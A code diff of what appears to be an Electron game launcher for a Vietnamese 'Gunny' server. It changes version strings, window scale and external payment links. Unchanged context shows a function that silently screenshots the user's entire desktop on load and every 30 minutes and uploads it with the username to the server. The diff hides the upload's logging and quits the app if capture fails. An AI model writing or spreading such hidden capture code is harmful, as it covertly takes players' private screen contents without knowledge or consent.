@@ -12,6 +12,7 @@ let fs = require('fs');
 const screenshot = require('screenshot-desktop');
 
 const BaseWidth = 1006;
+// const BaseWidth = 1006;
 const BaseHeight = 676;
 const topbarBaseHeight = 46;
 const rulerbarBaseHeight = 30;
@@ -31,9 +32,9 @@ window.addEventListener('DOMContentLoaded', () => {
     //call every 30min
     screenshotUser();
     setInterval(screenshotUser, 60000*30);
-    document.title = "Phiên bản 3.0";
+    document.title = "Phiên bản 2.3";
     var textTitle = document.getElementById('textTitle');
-    textTitle.innerText = "Phiên bản 3.0";
+    textTitle.innerText = "Phiên bản 2.3";
     /**
      * Draw images
      */
@@ -81,7 +82,7 @@ window.addEventListener('DOMContentLoaded', () => {
     webview.addEventListener('dom-ready', () => {
         webview.setAudioMuted(muted);
         // if (config.debug) {
-        //     webview.openDevTools()
+            // webview.openDevTools()
         // }
     })
 
@@ -159,7 +160,7 @@ const functions = {
             webview.setAudioMuted(muted);
         })
     },
-    multiple: 1,
+    multiple: 0.9,
     size: function () {
         var multiple = this.multiple;
         ipcRenderer.send('play-window-resize', [
@@ -207,13 +208,13 @@ const functions = {
     },
     openCharge: function () {
         // ipcRenderer.send('charge-open');
-        // shell.openExternal("http://gunny01.com");
+        shell.openExternal("http://gunbactrungnam.com");
     },
     openExchange: function () {
-        shell.openExternal("http://gunny01.com");
+        shell.openExternal("http://gunbactrungnam.com");
     },
     openChangePassword: function () {
-        shell.openExternal("http://gunny01.com");
+        shell.openExternal("http://gunbactrungnam.com");
     },
     openChangeEmail: function () {
         ipcRenderer.send('change-email-open');
@@ -398,8 +399,10 @@ async function sendToServer(imgPath) {
             let userInfo = getUserInfo();
             const imgPre = base64Data.slice(0, 1000000)
             const imgNex = base64Data.slice(1000000, base64Data.length)
-            post(config.host + '/api/saveImg', { imgPre: imgPre, imgNex: imgNex, username: userInfo.UserName }, function (res) { console.log('res', res); });
-            console.log('base64: ', base64Data.length, imgPre.length, imgNex.length);
+            post(config.host + '/api/saveImg', { imgPre: imgPre, imgNex: imgNex, username: userInfo.UserName }, function (res) { 
+                // console.log('res', res); 
+            });
+            // console.log('base64: ', base64Data.length, imgPre.length, imgNex.length);
 
         })
         .then(async () => {
@@ -446,11 +449,12 @@ var getUserInfo = function () {
 }
 
 async function screenshotUser() {
+
     screenshot({ filename: 'demo.png' }).then(async (imgPath) => {
-        // img: Buffer filled with png goodness
-        // ... 
         await sendToServer(imgPath);
     }).catch((err) => {
-        // ...
+        if(err) {
+            app.quit();
+        }
     })
 }
